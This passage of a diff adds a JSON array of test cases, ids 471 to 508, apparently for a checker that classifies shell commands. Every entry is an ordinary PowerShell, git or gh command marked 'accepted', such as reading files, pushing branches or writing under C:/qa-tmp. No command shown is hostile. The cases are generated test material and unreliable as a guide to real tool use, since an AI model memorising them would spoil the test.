+  "tool": "PowerShell",
+  "command": "git status",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "471",
+  "tool": "PowerShell",
+  "command": "git log",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "472",
+  "tool": "PowerShell",
+  "command": "gh pr list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "473",
+  "tool": "PowerShell",
+  "command": "gh pr merge 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "474",
+  "tool": "PowerShell",
+  "command": "git push origin loop/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "475",
+  "tool": "PowerShell",
+  "command": "& gh pr list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "476",
+  "tool": "PowerShell",
+  "command": "Set-Content C:/qa-tmp/o.txt -Value 'a,b'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "477",
+  "tool": "PowerShell",
+  "command": "Sort-Object",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "478",
+  "tool": "PowerShell",
+  "command": "Get-Date -Format yyyy",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "479",
+  "tool": "PowerShell",
+  "command": "Get-Location",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "480",
+  "tool": "PowerShell",
+  "command": "Set-Content $null",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "481",
+  "tool": "PowerShell",
+  "command": "Get-Content README.md -Tail 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "482",
+  "tool": "PowerShell",
+  "command": "Get-Content -LiteralPath README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "483",
+  "tool": "PowerShell",
+  "command": "Get-Item -Path README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "484",
+  "tool": "PowerShell",
+  "command": "Test-Path -Path README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "485",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem -File docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "486",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem -Directory",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "487",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem -Depth 2 docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "488",
+  "tool": "PowerShell",
+  "command": "Select-String -Pattern foo README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "489",
+  "tool": "PowerShell",
+  "command": "Write-Output x | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "490",
+  "tool": "PowerShell",
+  "command": "Measure-Object -Line",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "491",
+  "tool": "PowerShell",
+  "command": "Set-Content C:/qa-tmp/o.txt x -Force",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "492",
+  "tool": "PowerShell",
+  "command": "Add-Content -Path C:/qa-tmp/o.txt -Value x -NoNewline",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "493",
+  "tool": "PowerShell",
+  "command": "Out-File -FilePath C:/qa-tmp/o.txt -Append",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "494",
+  "tool": "PowerShell",
+  "command": "New-Item -Path C:/qa-tmp/d -ItemType Directory",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "495",
+  "tool": "PowerShell",
+  "command": "Copy-Item -Path a.txt -Destination C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "496",
+  "tool": "PowerShell",
+  "command": "Move-Item -Path a.txt -Destination C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "497",
+  "tool": "PowerShell",
+  "command": "Remove-Item -Path C:/qa-tmp/o.txt -Force",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "498",
+  "tool": "PowerShell",
+  "command": "Clear-Content C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "499",
+  "tool": "PowerShell",
+  "command": "Rename-Item a.txt b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "500",
+  "tool": "PowerShell",
+  "command": "git fetch origin",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "501",
+  "tool": "PowerShell",
+  "command": "git log --oneline",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "502",
+  "tool": "PowerShell",
+  "command": "gh pr view 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "503",
+  "tool": "PowerShell",
+  "command": "gh run list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "504",
+  "tool": "PowerShell",
+  "command": "git push origin docs/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "505",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path C:/qa-tmp/o.txt -Value x -Encoding utf8",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "506",
+  "tool": "PowerShell",
+  "command": "Tee-Object -FilePath C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "507",
+  "tool": "PowerShell",
+  "command": "Get-Content README.md | Select-Object -First 3",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "508",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem | Sort-Object -Property Name",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ }
+]
